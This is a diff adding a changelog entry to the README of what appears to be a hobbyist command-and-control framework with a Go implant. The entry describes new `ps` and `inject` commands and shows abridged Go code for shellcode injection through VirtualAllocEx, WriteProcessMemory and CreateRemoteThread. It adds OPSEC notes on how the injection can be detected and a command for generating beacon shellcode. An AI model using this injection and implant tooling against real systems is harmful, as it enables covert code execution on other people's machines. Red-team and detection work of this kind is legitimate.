@@ -49,6 +49,49 @@ _A Makefile is not provided because I am lazy_
 
 ## Change Log
 
+#### 24/11/2023 - Shellcode Injection via CreateRemoteThread (Session Passing)
+- 2 new commands: `ps` and `inject`
+    - `ps` lists all running processes on the target as well as their PID, PPID, Name, Arch, Session & User.
+        - `Usage: ps`
+![24/11/2023](https://i.imgur.com/GAYSs0m.png)
+    - `inject` injects shellcode into a running process via `CreateRemoteThread`
+![24/11/2023](https://i.imgur.com/H7OD72D.png)
+        - `Usage: inject <pid> <path_to_binfile>`
+        - `Example: inject 17952 ../shellcode/calc/calc.bin`
+        - The shellcode is loaded from a file, and is base64 encoded before being sent to the target.
+        - The shellcode is then decoded and injected into the target process via `CreateRemoteThread`
+        ```go
+        var kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+
+        var (
+            virtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
+            writeProcessMemory  = kernel32.NewProc("WriteProcessMemory")
+            createRemoteThread  = kernel32.NewProc("CreateRemoteThread")
+            WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+            closeHandle         = kernel32.NewProc("CloseHandle")
+        )
+        ...
+        process_handle, err := windows.OpenProcess(..., uint32(pid), ...)
+        ...
+        addr, _, err := virtualAllocEx.Call(..., uintptr(len(shellcode)), ..., windows.PAGE_EXECUTE_READWRITE) // BAD
+        ...
+        _, _, err := writeProcessMemory.Call(..., addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+        ...
+        thread_handle, _, err := createRemoteThread.Call(uintptr(process_handle), 0,  0, addr, 0, 0, 0)
+
+        closeHandle.Call(uintptr(thread_handle))
+        closeHandle.Call(uintptr(process_handle))
+        ```
+    - OPSEC considerations (why this is a budget injection):
+        - `VirtualAllocEx` is called with PAGE_EXECUTE_READWRITE
+        - Unbacked memory allocation 
+        - Thread start address is 0x0 
+
+- `./shellcode/calc/calc.bin` is x64 shellcode that spawns calc.exe ~ [_thanks boku7_](https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm)
+- `./shellcode/beacon/winton-win64.bin` is x64 shellcode that spawns a new beacon ~ [_thanks donut_](https://github.com/TheWover/donut) -
+    - generated using [exe2_csh](https://github.com/gatariee/exe2c_sh) 
+    - `./exe2sh.py -i winton-win64.exe -o ./shellcode/beacon/winton-win64.bin`
+
 #### 15/11/2023 - Mass codebase refactoring & implementation of shell commands 
 - The codebase has been refactored to be more modular and easier to read, (teamserver & go implant)
     - Doesn't exactly follow Go best practices, but it's certainly better than before. 
